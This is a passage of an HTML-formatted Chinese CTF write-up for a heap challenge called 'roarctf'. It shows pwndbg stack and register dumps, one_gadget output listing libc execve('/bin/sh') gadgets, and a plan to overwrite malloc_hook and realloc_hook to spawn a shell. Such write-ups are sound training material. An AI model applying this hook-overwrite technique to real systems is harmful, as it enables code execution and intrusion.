class=&#34;number&#34;&gt;07&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0038&lt;/span&gt;│      &lt;span class=&#34;number&#34;&gt;0x7ffc37dd48d8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x100000010&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;─────────────────────────────────[ BACKTRACE ]──────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ► f &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;     &lt;span class=&#34;number&#34;&gt;7f&lt;/span&gt;55c0ffd028 &lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;680&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;     &lt;span class=&#34;number&#34;&gt;55f&lt;/span&gt;afa1d3cd1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;        &lt;span class=&#34;number&#34;&gt;7f&lt;/span&gt;a1d39a0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;        &lt;span class=&#34;number&#34;&gt;100000010&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;        &lt;span class=&#34;number&#34;&gt;100000006&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;3b&lt;/span&gt;dcd6e58a0f900&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;     &lt;span class=&#34;number&#34;&gt;7f&lt;/span&gt;fc37dd4910&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;     &lt;span class=&#34;number&#34;&gt;55f&lt;/span&gt;afa1d4258&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;        &lt;span class=&#34;number&#34;&gt;137&lt;/span&gt;dd49f0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;3b&lt;/span&gt;dcd6e58a0f900&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;     &lt;span class=&#34;number&#34;&gt;55f&lt;/span&gt;afa1d42c0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Program received signal &lt;span class=&#34;title function_&#34;&gt;SIGSEGV&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(fault address &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; &lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt; 40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;00:0000│ rsp  0x7ffc37dd48a0 ◂— 0x7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;01:0008│      0x7ffc37dd48a8 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;02:0010│      0x7ffc37dd48b0 —▸ 0x7ffc37dd48f0 —▸ 0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;03:0018│      0x7ffc37dd48b8 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;04:0020│      0x7ffc37dd48c0 —▸ 0x7ffc37dd49f0 ◂— 0x1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;05:0028│      0x7ffc37dd48c8 —▸ 0x55fafa1d3cd1 ◂— mov    qword ptr [rbp - 0x10], rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;06:0030│      0x7ffc37dd48d0 ◂— 0x7fa1d39a0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;07:0038│      0x7ffc37dd48d8 ◂— 0x100000010&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;08:0040│      0x7ffc37dd48e0 ◂— 0x100000006&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;09:0048│      0x7ffc37dd48e8 ◂— 0x3bdcd6e58a0f900&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0a:0050│      0x7ffc37dd48f0 —▸ 0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0b:0058│      0x7ffc37dd48f8 —▸ 0x55fafa1d4258 ◂— jmp    0x55fafa1d42ad&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0c:0060│      0x7ffc37dd4900 ◂— 0x137dd49f0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0d:0068│      0x7ffc37dd4908 ◂— 0x3bdcd6e58a0f900&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0e:0070│      0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0f:0078│      0x7ffc37dd4918 —▸ 0&lt;span class=&#34;title function_&#34;&gt;x7f55c0f98840&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(__libc_start_main+&lt;span class=&#34;number&#34;&gt;240&lt;/span&gt;)&lt;/span&gt; ◂— mov    edi, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10:0080│      0x7ffc37dd4920 —▸ 0x7ffc37dd49f8 —▸ 0x7ffc37dd6080 ◂— &amp;#x27;./roarctf&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12:0090│      0x7ffc37dd4930 ◂— 0x1c1104708&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13:0098│      0x7ffc37dd4938 —▸ 0x55fafa1d41ec ◂— push   rbp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14:00a0│      0x7ffc37dd4940 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15:00a8│      0x7ffc37dd4948 ◂— 0x21d72319ef57efa6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16:00b0│      0x7ffc37dd4950 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17:00b8│      0x7ffc37dd4958 —▸ 0x7ffc37dd49f0 ◂— 0x1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18:00c0│      0x7ffc37dd4960 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1a:00d0│      0x7ffc37dd4970 ◂— 0x75dab899f897efa6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1b:00d8│      0x7ffc37dd4978 ◂— 0x748956d06527efa6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1c:00e0│      0x7ffc37dd4980 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1f:00f8│      0x7ffc37dd4998 —▸ 0x7ffc37dd4a08 —▸ 0x7ffc37dd608a ◂— 0&lt;span class=&#34;title function_&#34;&gt;x52454d554e5f434c&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;LC_NUMER&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20:0100│      0x7ffc37dd49a0 —▸ 0x7f55c1569168 —▸ 0x55fafa1d3000 ◂— jg     0x55fafa1d3047&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21:0108│      0x7ffc37dd49a8 —▸ 0&lt;span class=&#34;title function_&#34;&gt;x7f55c135280b&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(_dl_init+&lt;span class=&#34;number&#34;&gt;139&lt;/span&gt;)&lt;/span&gt; ◂— jmp    0x7f55c13527e0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22:0110│      0x7ffc37dd49b0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24:0120│      0x7ffc37dd49c0 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25:0128│      0x7ffc37dd49c8 —▸ 0x7ffc37dd49f0 ◂— 0x1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26:0130│      0x7ffc37dd49d0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27:0138│      0x7ffc37dd49d8 —▸ 0x55fafa1d39c9 ◂— hlt    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们来看看 onegadegt:&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ one_gadget /lib/x86_64-linux-gnu/libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt; -l3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/var/lib/gems/&lt;span class=&#34;number&#34;&gt;2.3&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;/gems/one_gadget&lt;span class=&#34;number&#34;&gt;-1.6&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;/lib/one_gadget/fetchers/base.rb:&lt;span class=&#34;number&#34;&gt;45&lt;/span&gt;: warning: Insecure world writable dir /home/giantbranch in PATH, mode &lt;span class=&#34;number&#34;&gt;040777&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x45226&lt;/span&gt;	execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  rax == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x4527a&lt;/span&gt;	execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsp+&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xcd173&lt;/span&gt;	execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rcx, r12)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rcx] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || rcx == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [r12] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || r12 == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xcd248&lt;/span&gt;	execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rax, r12)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rax] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || rax == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [r12] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || r12 == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf03a4&lt;/span&gt;	execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsp+&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf03b0&lt;/span&gt;	execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsi, [rax])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsi] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || rsi == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [[rax]] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || [rax] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf1247&lt;/span&gt;	execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rsp+&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;, environ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rsp+&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf67f0&lt;/span&gt;	execve(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, rcx, [rbp&lt;span class=&#34;number&#34;&gt;-0xf8&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;constraints:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [rcx] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || rcx == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  [[rbp&lt;span class=&#34;number&#34;&gt;-0xf8&lt;/span&gt;]] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt; || [rbp&lt;span class=&#34;number&#34;&gt;-0xf8&lt;/span&gt;] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个时候我们尝试 realloc_hook,mallo_hook 复写为 realloc，realloc_hook 写为 onegadget ,&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;─────────────────────────────────[ REGISTERS ]──────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RAX  &lt;span class=&#34;number&#34;&gt;0xcafebabedeadbeef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RBX  &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RCX  &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RDX  &lt;span class=&#34;number&#34;&gt;0x7f31162cc02a&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;682&lt;/span&gt;) ◂— xor    esi, esi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RDI  &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RSI  &lt;span class=&#34;number&#34;&gt;0x55fc4e86dcd1&lt;/span&gt; ◂— mov    qword ptr [rbp - &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;], rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R8   &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R9   &lt;span 